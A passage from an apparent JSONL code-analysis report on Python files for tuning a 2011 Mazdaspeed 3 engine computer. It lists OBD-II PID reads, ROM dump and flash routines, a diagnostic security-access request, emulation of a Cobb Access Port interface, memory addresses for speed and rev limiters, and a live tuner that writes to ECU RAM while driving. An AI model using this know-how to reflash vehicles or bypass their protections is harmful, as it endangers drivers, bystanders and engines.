"content": "0x0C: \"Fuel final base\","}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D: \"Fuel final correction\","}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0E: \"Ignition base timing\","}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F: \"Ignition correction\","}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "0x10: \"MAF voltage\","}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: \"MAF g/s\","}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "0x12: \"Injector pulse width\","}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "0x13: \"Fuel pump duty cycle\","}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "0x14: \"EGT bank 1\","}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "0x15: \"EGT bank 2\""}, {"type": "protocol", "line": 59, "protocol": "OBD", "content": "\"\"\"Initialize OBD-II connection\"\"\""}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x81, 0x13, 0xF1, 0x81]),  # Start communication"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x10, 0x03]),  # Set protocol"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can.send_can_message(0x7E0, cmd)"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "def read_pid(self, pid: int, mode: int = 0x01) -> Optional[float]:"}, {"type": "protocol", "line": 76, "protocol": "OBD", "content": "Read OBD-II PID value"}, {"type": "protocol", "line": 76, "protocol": "PID", "content": "Read OBD-II PID value"}, {"type": "protocol", "line": 77, "protocol": "0x[0-9A-Fa-f]+", "content": "mode 0x01 = Show current data"}, {"type": "protocol", "line": 78, "protocol": "0x[0-9A-Fa-f]+", "content": "mode 0x22 = Read data by identifier (proprietary)"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "if mode == 0x01 and pid not in self.STANDARD_PIDS:"}, {"type": "protocol", "line": 80, "protocol": "PID", "content": "if mode == 0x01 and pid not in self.STANDARD_PIDS:"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "if mode == 0x22 and pid not in self.MAZDA_PIDS:"}, {"type": "protocol", "line": 82, "protocol": "PID", "content": "if mode == 0x22 and pid not in self.MAZDA_PIDS:"}, {"type": "protocol", "line": 86, "protocol": "0x[0-9A-Fa-f]+", "content": "if mode == 0x01:"}, {"type": "protocol", "line": 89, "protocol": "0x[0-9A-Fa-f]+", "content": "request = bytes([mode, pid >> 8, pid & 0xFF])"}, {"type": "protocol", "line": 91, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can.send_can_message(0x7E0, request)"}, {"type": "protocol", "line": 100, "protocol": "OBD", "content": "\"\"\"Parse OBD response data into engineering units\"\"\""}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "if mode == 0x01:"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "if pid == 0x04:  # Engine load"}, {"type": "protocol", "line": 105, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x05:  # Coolant temp"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0C:  # Engine RPM"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0D:  # Vehicle speed"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0F:  # Intake air temp"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x11:  # Throttle position"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "elif mode == 0x22:"}, {"type": "protocol", "line": 118, "protocol": "0x[0-9A-Fa-f]+", "content": "if pid in [0x01, 0x02]:  # Boost pressure"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x03:  # Wastegate duty"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in [0x04, 0x05, 0x06, 0x07]:  # VVT"}, {"type": "protocol", "line": 124, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in range(0x08, 0x0C):  # Knock retard"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in [0x0C, 0x0D]:  # Fuel"}, {"type": "protocol", "line": 128, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in [0x0E, 0x0F]:  # Ignition"}, {"type": "protocol", "line": 130, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x10:  # MAF voltage"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x11:  # MAF g/s"}, {"type": "protocol", "line": 134, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x12:  # Injector pulse"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x13:  # Fuel pump duty"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in [0x14, 0x15]:  # EGT"}, {"type": "protocol", "line": 145, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_cmd = bytes([0x03])  # Read DTCs"}, {"type": "protocol", "line": 146, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can.send_can_message(0x7E0, dtc_cmd)"}, {"type": "protocol", "line": 166, "protocol": "0x[0-9A-Fa-f]+", "content": "first_char = (byte1 >> 6) & 0x03"}, {"type": "protocol", "line": 167, "protocol": "0x[0-9A-Fa-f]+", "content": "second_char = (byte1 >> 4) & 0x03"}, {"type": "protocol", "line": 168, "protocol": "0x[0-9A-Fa-f]+", "content": "code1 = byte1 & 0x0F"}, {"type": "protocol", "line": 169, "protocol": "0x[0-9A-Fa-f]+", "content": "code2 = (byte2 >> 4) & 0x0F"}, {"type": "protocol", "line": 170, "protocol": "0x[0-9A-Fa-f]+", "content": "code3 = byte2 & 0x0F"}, {"type": "protocol", "line": 179, "protocol": "0x[0-9A-Fa-f]+", "content": "clear_cmd = bytes([0x04])  # Clear DTCs"}, {"type": "protocol", "line": 180, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can.send_can_message(0x7E0, clear_cmd)"}, {"type": "protocol", "line": 183, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x44"}, {"type": "protocol", "line": 190, "protocol": "0x[0-9A-Fa-f]+", "content": "for pid in [0x04, 0x05, 0x0C, 0x0D, 0x0F, 0x11]:"}, {"type": "protocol", "line": 191, "protocol": "0x[0-9A-Fa-f]+", "content": "value = self.read_pid(pid, 0x01)"}, {"type": "protocol", "line": 193, "protocol": "PID", "content": "data[self.STANDARD_PIDS[pid]] = value"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "for pid in range(0x01, 0x16):"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "value = self.read_pid(pid, 0x22)"}, {"type": "protocol", "line": 199, "protocol": "PID", "content": "data[self.MAZDA_PIDS[pid]] = value"}], "hardware_assumptions": [{"type": "hardware", "line": 22, "hardware": "vehicle", "content": "0x0D: \"Vehicle speed\","}, {"type": "hardware", "line": 25, "hardware": "vehicle", "content": "0x1C: \"OBD standards this vehicle conforms to\","}, {"type": "hardware", "line": 109, "hardware": "vehicle", "content": "elif pid == 0x0D:  # Vehicle speed"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb11.py", "lines_read": 303, "features_found": [{"type": "function", "name": "__init__", "line": 19}, {"type": "function", "name": "read_entire_rom", "line": 28}, {"type": "function", "name": "flash_calibration_file", "line": 59}, {"type": "function", "name": "_enter_flash_mode", "line": 116}, {"type": "function", "name": "_exit_flash_mode", "line": 136}, {"type": "function", "name": "_backup_calibration", "line": 149}, {"type": "function", "name": "_parse_calibration_file", "line": 172}, {"type": "function", "name": "_parse_ctm_format", "line": 191}, {"type": "function", "name": "_parse_backup_format", "line": 217}, {"type": "function", "name": "_flash_block", "line": 247}, {"type": "function", "name": "_verify_block", "line": 262}, {"type": "function", "name": "recover_bricked_ecu", "line": 285}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "crcmod", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Optional,", "line": null}], "components_found": [{"type": "class", "name": "FlashManager", "line": 13}], "algorithms": [], "protocols": [{"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "total_size = 0x80000  # 512KB ROM"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "if address % 0x4000 == 0:"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x10, 0x02]),  # Start diagnostic session"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x27, 0x05]),  # Security access level 5"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x01, 0xFF, 0x00]),  # Start routine"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "self.ecu.can.send_can_message(0x7E0, cmd)"}, {"type": "protocol", "line": 129, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response.data[0] != 0x7F:"}, {"type": "protocol", "line": 139, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x02]),  # Stop routine"}, {"type": "protocol", "line": 140, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x10, 0x01]),  # Return to default session"}, {"type": "protocol", "line": 144, "protocol": "0x[0-9A-Fa-f]+", "content": "self.ecu.can.send_can_message(0x7E0, cmd)"}, {"type": "protocol", "line": 156, "protocol": "0x[0-9A-Fa-f]+", "content": "header = struct.pack('<8sII', b'MS3BACKUP', 0x01, len(calibration_dump))"}, {"type": "protocol", "line": 294, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x10, 0x02]),  # Diagnostic session"}, {"type": "protocol", "line": 295, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x11, 0x01]),  # ECU reset"}, {"type": "protocol", "line": 299, "protocol": "0x[0-9A-Fa-f]+", "content": "self.ecu.can.send_can_message(0x7E0, cmd)"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "ECU Flash Management System"}, {"type": "hardware", "line": 3, "hardware": "ECU", "content": "Handles reading, writing, and verifying ECU flash memory"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "ECU Flash Memory Management"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "def __init__(self, ecu):"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "self.ecu = ecu"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "Read entire ECU ROM to file"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "data = self.ecu.can.read_memory(address, chunk_size)"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "Flash calibration file to ECU with safety checks"}, {"type": "hardware", "line": 117, "hardware": "ECU", "content": "\"\"\"Enter ECU flash programming mode\"\"\""}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "bytes([0x27, 0x05]),  # Security access level 5"}, {"type": "hardware", "line": 126, "hardware": "ECU", "content": "self.ecu.can.send_can_message(0x7E0, cmd)"}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "response = self.ecu.can.receive_can_message(1.0)"}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "\"\"\"Exit ECU flash programming mode\"\"\""}, {"type": "hardware", "line": 144, "hardware": "ECU", "content": "self.ecu.can.send_can_message(0x7E0, cmd)"}, {"type": "hardware", "line": 152, "hardware": "ECU", "content": "calibration_dump = self.ecu.dump_full_calibration()"}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "address = self.ecu.CALIBRATION_TABLES.get(table_name, 0)"}, {"type": "hardware", "line": 254, "hardware": "ECU", "content": "if not self.ecu.can.write_memory(address + i, chunk):"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "read_data = self.ecu.can.read_memory(address, len(expected_data))"}, {"type": "hardware", "line": 285, "hardware": "ECU", "content": "def recover_bricked_ecu(self, backup_file: str) -> bool:"}, {"type": "hardware", "line": 287, "hardware": "ECU", "content": "Attempt to recover a bricked ECU using backup file"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "print(\"[*] Attempting ECU recovery...\")"}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "bytes([0x11, 0x01]),  # ECU reset"}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "self.ecu.can.send_can_message(0x7E0, cmd)"}], "security_logic": [{"type": "security_pattern", "line": 8, "pattern": "hash", "content": "import hashlib"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb12.py", "lines_read": 391, "features_found": [{"type": "function", "name": "__init__", "line": 22}, {"type": "function", "name": "start_monitoring", "line": 34}, {"type": "function", "name": "stop_monitoring", "line": 42}, {"type": "function", "name": "_monitor_loop", "line": 49}, {"type": "function", "name": "_display_current_values", "line": 71}, {"type": "function", "name": "_get_parameter_unit", "line": 98}, {"type": "function", "name": "start_logging", "line": 114}, {"type": "function", "name": "stop_logging", "line": 123}, {"type": "function", "name": "export_log", "line": 128}, {"type": "function", "name": "plot_parameters", "line": 155}, {"type": "function", "name": "__init__", "line": 200}, {"type": "function", "name": "adjust_parameter", "line": 211}, {"type": "function", "name": "_validate_adjustment", "line": 226}, {"type": "function", "name": "_adjust_realtime_parameter", "line": 242}, {"type": "function", "name": "_adjust_calibration_parameter", "line": 266}, {"type": "function", "name": "_engineering_to_raw", "line": 274}, {"type": "function", "name": "create_boost_map", "line": 288}, {"type": "function", "name": "_parse_boost_table", "line": 324}, {"type": "function", "name": "_serialize_boost_table", "line": 328}, {"type": "function", "name": "_modify_boost_tables", "line": 332}, {"type": "function", "name": "reset_all_adjustments", "line": 349}, {"type": "function", "name": "save_tuning_profile", "line": 357}, {"type": "function", "name": "load_tuning_profile", "line": 375}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "csv", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "deque", "line": null}, {"type": "import", "module": "matplotlib.pyplot", "line": null}, {"type": "import", "module": "numpy", "line": null}], "components_found": [{"type": "class", "name": "RealTimeMonitor", "line": 16}, {"type": "class", "name": "LiveTuner", "line": 194}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 18, "hardware": "ECU", "content": "Real-time ECU parameter monitoring and visualization"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "def __init__(self, ecu):"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "self.ecu = ecu"}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "value = self.ecu.read_realtime_parameter(param)"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "Allows real-time modification of ECU parameters while driving"}, {"type": "hardware", "line": 200, "hardware": "ECU", "content": "def __init__(self, ecu):"}, {"type": "hardware", "line": 201, "hardware": "ECU", "content": "self.ecu = ecu"}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "current_value = self.ecu.read_realtime_parameter(param_name)"}, {"type": "hardware", "line": 236, "hardware": "ABS", "content": "if abs(new_value) > limit:"}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "\"\"\"Adjust parameter in ECU RAM (immediate effect)\"\"\""}, {"type": "hardware", "line": 244, "hardware": "ECU", "content": "current_value = self.ecu.read_realtime_parameter(param_name)"}, {"type": "hardware", "line": 256, "hardware": "ECU", "content": "address = self.ecu.REALTIME_PARAMS[param_name]"}, {"type": "hardware", "line": 259, "hardware": "ECU", "content": "if self.ecu.can.write_memory(address, raw_bytes):"}, {"type": "hardware", "line": 275, "hardware": "ECU", "content": "\"\"\"Convert engineering units to raw ECU values\"\"\""}, {"type": "hardware", "line": 292, "hardware": "ECU", "content": "boost_target_data = self.ecu.read_calibration_table('BOOST_TARGET')"}, {"type": "hardware", "line": 293, "hardware": "ECU", "content": "wg_duty_data = self.ecu.read_calibration_table('BOOST_WG_DUTY')"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "if (self.ecu.write_calibration_table('BOOST_TARGET', new_boost_data) and"}, {"type": "hardware", "line": 311, "hardware": "ECU", "content": "self.ecu.write_calibration_table('BOOST_WG_DUTY', new_wg_data)):"}, {"type": "hardware", "line": 363, "hardware": "ECU", "content": "'ecu_info': self.ecu.can.read_ecu_identification()"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb2.py", "lines_read": 144, "features_found": [{"type": "function", "name": "__init__", "line": 24}, {"type": "function", "name": "load_driver", "line": 29}, {"type": "function", "name": "PassThruOpen", "line": 40}, {"type": "function", "name": "PassThruConnect", "line": 56}, {"type": "function", "name": "PassThruReadMsgs", "line": 78}, {"type": "function", "name": "PassThruWriteMsgs", "line": 100}, {"type": "function", "name": "ecu_reprogramming_mode", "line": 120}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "platform", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "wintypes", "line": null}], "components_found": [{"type": "class", "name": "J2534Protocol", "line": 18}, {"type": "class", "name": "PASSTHRU_MSG", "line": 135}], "algorithms": [], "protocols": [{"type": "protocol", "line": 5, "protocol": "J2534", "content": "J2534 Pass-Thru Protocol Implementation"}, {"type": "protocol", "line": 6, "protocol": "J2534", "content": "Emulates Cobb Access Port J2534 interface for direct ECU flashing"}, {"type": "protocol", "line": 18, "protocol": "J2534", "content": "class J2534Protocol:"}, {"type": "protocol", "line": 20, "protocol": "J2534", "content": "J2534 Pass-Thru implementation for Mazdaspeed 3 ECU communication"}, {"type": "protocol", "line": 31, "protocol": "J2534", "content": "Load J2534 DLL driver (Cobb AP emulation)"}, {"type": "protocol", "line": 37, "protocol": "J2534", "content": "print(f\"Failed to load J2534 driver: {e}\")"}, {"type": "protocol", "line": 42, "protocol": "J2534", "content": "Initialize connection to J2534 device"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "return 0xFFFFFFFF"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "return 0xFFFFFFFF"}, {"type": "protocol", "line": 105, "protocol": "0x[0-9A-Fa-f]+", "content": "return 0xFFFFFFFF"}, {"type": "protocol", "line": 126, "protocol": "CAN", "content": "bootloader_msg.ProtocolID = 6  # CAN"}, {"type": "protocol", "line": 129, "protocol": "0x[0-9A-Fa-f]+", "content": "bootloader_msg.Data = (ctypes.c_byte * 8)(0x10, 0x02, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00)"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 6, "hardware": "ECU", "content": "Emulates Cobb Access Port J2534 interface for direct ECU flashing"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "J2534 Pass-Thru implementation for Mazdaspeed 3 ECU communication"}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "Connect to ECU using specified protocol"}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "Read messages from ECU"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "Write messages to ECU"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "def ecu_reprogramming_mode(self) -> bool:"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "Enter ECU reprogramming mode (Cobb-specific)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb3.py", "lines_read": 219, "features_found": [{"type": "function", "name": "__init__", "line": 86}, {"type": "function", "name": "read_calibration_table", "line": 91}, {"type": "function", "name": "write_calibration_table", "line": 101}, {"type": "function", "name": "read_realtime_parameter", "line": 111}, {"type": "function", "name": "_convert_to_engineering", "line": 128}, {"type": "function", "name": "dump_full_calibration", "line": 156}, {"type": "function", "name": "flash_calibration_file", "line": 169}, {"type": "function", "name": "_parse_ctm_file", "line": 196}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "binascii", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "MZRECU", "line": 13}], "algorithms": [], "protocols": [{"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "'ROM_START': 0x00000000,"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "'ROM_END': 0x0007FFFF,"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "'CALIBRATION_START': 0x00060000,"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "'CALIBRATION_END': 0x0007FFFF,"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "'RAM_START': 0xFFC00000,"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "'RAM_END': 0xFFC1FFFF,"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "'BOOTLOADER_START': 0x00000000,"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "'BOOTLOADER_END': 0x0000FFFF"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "'MAF_SCALING': 0x00061000,"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "'INJECTOR_SCALING': 0x00061100,"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "'FUEL_BASE': 0x00061200,"}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "'FUEL_OPEN_LOOP': 0x00061300,"}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "'FUEL_CLOSED_LOOP': 0x00061400,"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "'IGNITION_BASE': 0x00062000,"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "'IGNITION_ADVANCE': 0x00062100,"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "'IGNITION_RETARD': 0x00062200,"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "'BOOST_TARGET': 0x00063000,"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "'BOOST_WG_DUTY': 0x00063100,"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "'BOOST_LIMITS': 0x00063200,"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "'VVT_INTAKE': 0x00064000,"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "'VVT_EXHAUST': 0x00064100,"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "'FUEL_CUT': 0x00065000,"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "'SPEED_LIMITER': 0x00065100,"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "'REV_LIMITER': 0x00065200,"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "'COBB_ACCESS_MAP': 0x00068000,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "'COBB_SECURITY': 0x00068100"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "'ENGINE_RPM': 0xFFC01000,"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "'VEHICLE_SPEED': 0xFFC01002,"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "'ENGINE_LOAD': 0xFFC01004,"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "'THROTTLE_POSITION': 0xFFC01006,"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "'INTAKE_TEMP': 0xFFC01008,"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "'COOLANT_TEMP': 0xFFC0100A,"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "'MANIFOLD_PRESSURE': 0xFFC0100C,"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "'MAF_VOLTAGE': 0xFFC0100E,"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "'AFR': 0xFFC01010,"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "'IGNITION_TIMING': 0xFFC01012,"}, {"type": "protocol", "line": 76, "protocol": "0x[0-9A-Fa-f]+", "content": "'INJECTOR_PULSE': 0xFFC01014,"}, {"type": "protocol", "line": 77, "protocol": "0x[0-9A-Fa-f]+", "content": "'BOOST_SOLENOID': 0xFFC01016,"}, {"type": "protocol", "line": 78, "protocol": "0x[0-9A-Fa-f]+", "content": "'VVT_INTAKE_ACT': 0xFFC01018,"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "'VVT_EXHAUST_ACT': 0xFFC0101A,"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "'FUEL_TRIM_SHORT': 0xFFC0101C,"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "'FUEL_TRIM_LONG': 0xFFC0101E,"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "'KNOCK_RETARD': 0xFFC01020,"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "'WASTEGATE_DUTY': 0xFFC01022"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "MZR DISI Engine ECU Reverse Engineering"}, {"type": "hardware", "line": 6, "hardware": "ECU", "content": "Complete ECU memory map and parameter definitions for Mazdaspeed 3 2011"}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "class MZRECU:"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "'COBB_SECURITY': 0x00068100"}, {"type": "hardware", "line": 67, "hardware": "vehicle", "content": "'VEHICLE_SPEED': 0xFFC01002,"}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "Read specific calibration table from ECU"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "Write calibration table to ECU (requires tuning access level)"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "Read real-time parameter from ECU RAM"}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "Convert raw ECU values to engineering units"}, {"type": "hardware", "line": 135, "hardware": "vehicle", "content": "'VEHICLE_SPEED': lambda x: x * 0.621371,"}, {"type": "hardware", "line": 158, "hardware": "ECU", "content": "Dump all calibration tables from ECU"}, {"type": "hardware", "line": 171, "hardware": "ECU", "content": "Flash complete calibration file to ECU"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb4.py", "lines_read": 116, "features_found": [{"type": "function", "name": "main", "line": 17}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "protocols.can_bus", "line": null}, {"type": "import", "module": "ecu.mzr_disaster", "line": null}, {"type": "import", "module": "tuning.map_editor", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "argparse", "line": null}, {"type": "import", "module": "MZRCANProtocol", "line": null}, {"type": "import", "module": "MZRECU", "line": null}, {"type": "import", "module": "MapEditor3D,", "line": null}], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 13, "protocol": "CAN", "content": "from protocols.can_bus import 